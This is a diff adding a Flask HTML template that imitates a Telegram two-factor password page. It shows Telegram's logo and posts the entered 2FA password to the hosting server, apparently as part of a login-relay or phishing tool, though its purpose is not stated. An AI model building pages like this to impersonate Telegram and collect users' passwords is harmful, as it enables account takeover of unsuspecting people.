@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter a Password</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa;
+        }
+        .form-signin {
+            width: 100%;
+            max-width: 330px;
+            padding: 15px;
+            text-align: center;
+        }
+        .form-signin img {
+            margin-bottom: 15px;
+        }
+        .btn-block {
+            width: 100%;
+        }
+        .password-container {
+            position: relative;
+        }
+        .password-container .fa-eye, 
+        .password-container .fa-eye-slash {
+            position: absolute;
+            top: 50%;
+            right: 15px;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <form class="form-signin" action="/" method="post">
+        <input type="hidden" name="action" value="verify_2fa">
+        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" width="100" height="100">
+        <h1 class="h3 mb-3 font-weight-normal">Enter a Password</h1>
+        <p>Your account is protected with an additional password.</p>
+        <div class="form-floating mb-3 password-container">
+            <input type="password" id="password" name="password" class="form-control" placeholder="2FA Password" required>
+            <label for="password">2FA Password</label>
+            <i class="fas fa-eye" id="togglePassword"></i>
+        </div>
+        <button class="btn btn-lg btn-primary btn-block" type="submit">Next</button>
+        {% with messages = get_flashed_messages() %}
+        {% if messages %}
+        <div class="alert alert-warning mt-3">
+            {% for message in messages %}
+            <p>{{ message }}</p>
+            {% endfor %}
+        </div>
+        {% endif %}
+        {% endwith %}
+    </form>
+    <script>
+        const togglePassword = document.querySelector('#togglePassword');
+        const password = document.querySelector('#password');
+        
+        togglePassword.addEventListener('click', function (e) {
+            // Toggle the type attribute using getAttribute() and setAttribute()
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            // Toggle the eye / eye slash icon
+            this.classList.toggle('fa-eye-slash');
+        });
+    </script>
+</body>
+</html>
